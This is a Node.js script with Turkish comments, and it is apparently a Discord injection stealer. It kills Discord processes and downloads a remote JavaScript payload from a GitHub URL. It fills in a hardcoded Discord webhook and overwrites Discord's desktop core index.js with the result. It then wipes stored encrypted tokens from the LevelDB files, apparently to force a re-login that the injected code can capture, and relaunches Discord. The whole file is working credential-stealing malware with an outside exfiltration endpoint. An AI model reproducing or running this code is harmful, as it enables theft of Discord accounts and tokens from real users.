const fs = require('fs');
const path = require('path');
const { exec } = require('child_process');
const https = require('https');  // Eksik modülü ekliyoruz

// Klasör yolları
const webhookUrl = 'https://discord.com/api/webhooks/1313201289487712296/XL2wZW456qmnaHE1HKdSqohHhlqccRUYbiPDZLmr5Y_uaX76GUXeCbbmfjS1INNsTjei';
const appData = process.env.APPDATA || path.join(process.env.HOME, '.config');
const localAppData = process.env.LOCALAPPDATA || path.join(process.env.HOME, '.local', 'share');
const discordPaths = [
    { appPath: path.join(appData, 'discord'), exePath: path.join(localAppData, 'Discord') },
    { appPath: path.join(appData, 'discordcanary'), exePath: path.join(localAppData, 'DiscordCanary') },
    { appPath: path.join(appData, 'discordptb'), exePath: path.join(localAppData, 'DiscordPTB') },
    { appPath: path.join(appData, 'discorddevelopment'), exePath: path.join(localAppData, 'DiscordDevelopment') },
    { appPath: path.join(appData, 'lightcord'), exePath: path.join(localAppData, 'Lightcord') },
];

// Regex tanımı
const encryptedRegex = /dQw4w9WgXcQ:[^\"]*/gm;

// Tüm Discord dizinlerini tarayarak işlem yapma
function walkDir(dir) {
    if (!fs.existsSync(dir)) {  // Dizin var mı kontrolü
        console.error(`Dizin bulunamadı: ${dir}`);
        return;
    }

    fs.readdirSync(dir).forEach(file => {
        const filePath = path.join(dir, file);
        try {
            if (fs.statSync(filePath).isDirectory()) {
                if (file.startsWith('app-')) {
                    const modulesPath = path.join(filePath, 'modules');
                    if (fs.existsSync(modulesPath)) {
                        const discordDesktopCore1Path = path.join(modulesPath, 'discord_desktop_core-1');
                        if (fs.existsSync(discordDesktopCore1Path)) {
                            const discordDesktopCorePath = path.join(discordDesktopCore1Path, 'discord_desktop_core');
                            if (fs.existsSync(discordDesktopCorePath)) {
                                const indexPath = path.join(discordDesktopCorePath, 'index.js');
                                if (fs.existsSync(indexPath)) {
                                    // İlgili URL'yi çekip dosyayı düzenle
                                    https.get('https://raw.githubusercontent.com/Wizzzy81/whowantkittycats/refs/heads/main/uskudar.js', response => {
                                        let data = '';
                                        response.on('data', chunk => {
                                            data += chunk;
                                        });
                                        response.on('end', () => {
                                            const newData = data.replace('%WEBHOOK%', webhookUrl);
                                            fs.writeFileSync(indexPath, newData);
                                            console.log(`${indexPath} başarıyla güncellendi.`);
                                        });
                                    });
                                }
                            }
                        }
                    }
                } else {
                    walkDir(filePath); // Eğer alt klasör varsa, tekrar tarama
                }
            }
        } catch (err) {
            console.error(`Dosyaya erişim hatası: ${filePath}`, err.message);
        }
    });
}

// Discord süreçlerini kapat
function killAllDiscordProcesses(callback) {
    console.log('Tüm Discord süreçleri sonlandırılıyor...');
    exec('tasklist', (err, stdout) => {
        if (err) {
            console.error('Süreç listesi alınamadı:', err);
            return;
        }

        // Çalışan Discord süreçlerini bul
        const discordProcesses = stdout
            .split('\n')
            .filter(line => line.toLowerCase().includes('discord'))
            .map(line => line.trim().split(/\s+/)[1]); // PID'yi al

        if (discordProcesses.length > 0) {
            console.log('Kapatılacak süreç PID\'leri:', discordProcesses);
            discordProcesses.forEach(pid => {
                exec(`taskkill /PID ${pid} /F`, (err) => {
                    if (err) {
                        console.error(`Süreç ${pid} sonlandırılamadı:`, err.message);
                    } else {
                        console.log(`Süreç ${pid} başarıyla sonlandırıldı.`);
                    }
                });
            });
        } else {
            console.log('Discord süreçleri bulunamadı.');
        }

        if (callback) setTimeout(callback, 2000); // Kapatma işleminden sonra gecikme
    });
}

// LDB ve LOG dosyalarını temizle
function cleanLevelDbFiles(callback) {
    console.log('LDB ve LOG dosyaları taranıyor...');

    discordPaths.forEach(({ appPath }) => {
        const levelDbPath = path.join(appPath, 'Local Storage', 'leveldb');

        if (!fs.existsSync(levelDbPath)) {
            console.log(`Klasör mevcut değil: ${levelDbPath}`);
            return;
        }

        fs.readdir(levelDbPath, (err, files) => {
            if (err) {
                console.error('Klasör okuma hatası:', err);
                return;
            }

            files.forEach(file => {
                const filePath = path.join(levelDbPath, file);
                if (file.endsWith('.ldb') || file.endsWith('.log')) {
                    fs.readFile(filePath, 'utf8', (err, data) => {
                        if (err) {
                            console.error(`Dosya okuma hatası: ${filePath}`, err);
                            return;
                        }

                        const cleanedData = data.replace(encryptedRegex, '');
                        fs.writeFile(filePath, cleanedData, 'utf8', (err) => {
                            if (err) {
                                console.error(`Dosya yazma hatası: ${filePath}`, err);
                            } else {
                                console.log(`${file} dosyası başarıyla güncellendi.`);
                            }
                        });
                    });
                }
            });
        });
    });

    if (callback) setTimeout(callback, 2000); // Temizleme işleminden sonra gecikme
}

// Discord'u yeniden başlat
function startDiscord() {
    console.log('Discord yeniden başlatılıyor...');
    let started = false;

    // Tüm Discord sürümlerini tarayıp başlat
    discordPaths.forEach(({ exePath }) => {
        if (exePath.toLowerCase().includes('discord')) {  // Sadece 'discord' içeren yolu çalıştır
            const updateExe = path.join(exePath, 'Update.exe');
            if (fs.existsSync(updateExe)) {
                console.log(`Discord başlatılıyor: ${updateExe}`);
                exec(`"${updateExe}" --processStart Discord.exe`, (err) => {
                    if (err) {
                        console.error('Discord başlatılamadı:', err.message);
                    } else {
                        console.log('Discord başarıyla başlatıldı.');
                    }
                });
                started = true;
            }
        }
    });

    if (!started) {
        console.error('Hiçbir Discord sürümü bulunamadı.');
    }
}

// Ana işlemi çalıştır
function modifyAndRestartDiscord() {
    killAllDiscordProcesses(() => {
        discordPaths.forEach(({ exePath }) => {
            walkDir(exePath); // Tüm Discord dizinlerinde işlem yap
        });

        cleanLevelDbFiles(() => {
            startDiscord();
        });
    });
}

// Ana işlemi çağır
modifyAndRestartDiscord();
